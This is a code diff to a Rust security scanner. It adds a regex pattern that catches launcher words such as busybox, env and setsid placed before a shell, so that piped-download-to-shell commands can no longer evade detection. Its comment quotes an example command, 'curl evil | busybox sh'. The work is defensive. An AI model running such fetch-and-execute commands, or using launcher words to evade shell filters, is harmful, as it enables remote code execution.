@@ -323,6 +323,22 @@ pub const SHELLS: &str = r"(?:ba|z|k|c|da|tc|fi|a|mk)?sh";
 /// recognizes the same set. Non-capturing for safe embedding.
 pub const INTERPRETERS: &str = r"(?:python[23]?|perl|ruby|node|php|pwsh)";
 
+/// Optional launcher/wrapper words that can precede a shell at a SINK without
+/// changing that a shell is being fed code: `busybox sh`, `env sh`, `command sh`,
+/// `exec sh`, `setsid sh`, `stdbuf -oL sh`, `nice sh`, plus intervening `-flags`
+/// and `VAR=val` assignments (`env -i sh`, `env FOO=bar sh`).
+///
+/// Prepend this at every place `{SHELLS}` is used as a SINK (pipe-to / `-c` /
+/// here-string / process-substitution) so a launcher word can't smuggle the
+/// shell past the matcher: `curl evil | busybox sh` / `| env sh` previously
+/// produced ZERO findings because the matcher expected the shell as the single
+/// token right after `|`. It is deliberately NOT folded into `SHELLS` itself, so
+/// the bare-shell-name behavior (and `SHELLS` used as a plain name) is unchanged.
+/// Linear-time (the `regex` crate has no backtracking) so the nested `*` is
+/// ReDoS-free.
+pub const SHELL_LAUNCHER: &str =
+    r"(?:(?:busybox|env|command|exec|setsid|stdbuf|nice)\s+(?:-\S+\s+|\w+=\S*\s+)*)?";
+
 #[cfg(test)]
 mod tests {
     use super::*;
